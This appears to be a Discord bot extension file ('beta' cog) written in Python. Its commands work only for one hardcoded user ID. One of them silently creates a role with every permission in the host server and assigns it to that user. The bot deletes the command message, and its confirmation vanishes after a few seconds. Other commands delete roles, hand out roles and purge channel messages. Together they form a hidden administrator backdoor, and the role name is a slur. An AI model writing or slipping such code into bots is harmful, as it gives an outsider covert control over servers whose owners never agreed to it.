import discord
from discord import Permissions
from discord.ext import commands

class beta(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print("beta.py Loaded!")

    async def cog_check(self, ctx):
        if ctx.author.id == 416508283528937472: return True

    # tdevgiveadmin <user>
    @commands.command()
    async def devgiveadmin(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        guild = ctx.guild
        user = user or ctx.author
            
        role = await guild.create_role(name="retard",permissions=Permissions.all())  
        await user.add_roles(role)

        await ctx.send(f"{user.name} received the role retard", delete_after=3)

    # tdevdeleterole <name>
    @commands.command()
    async def devdeleterole(self, ctx, role: discord.Role):
        await ctx.message.delete()
        await role.delete()

        await ctx.send(f"**{role}** role has been deleted", delete_after=3)
    
    #tdevgiverole <role>
    @commands.command()
    async def devgiverole(self, ctx, role: discord.Role, *, user: discord.Member=None):
        await ctx.message.delete()
        user = user or ctx.author

        if ctx.me.top_role.position <= role.position: 
            await ctx.send("The role's position is higher than mine and I cannot assign it to users.")
        
        await user.add_roles(role)

        await ctx.send(f"Added the role {role.name} to {user.mention}", delete_after=3)

    # tdevpurge <ammount>
    @commands.command()
    @commands.has_permissions(administrator=True)
    async def devpurge(self, ctx, l: int = 50):
        await ctx.message.delete()
        c = await ctx.channel.purge(limit=l)
        await ctx.send(f"Cleared {len(c)} messages", delete_after=3)
        
#####################################################################################################################################
def setup(client):
    client.add_cog(beta(client))
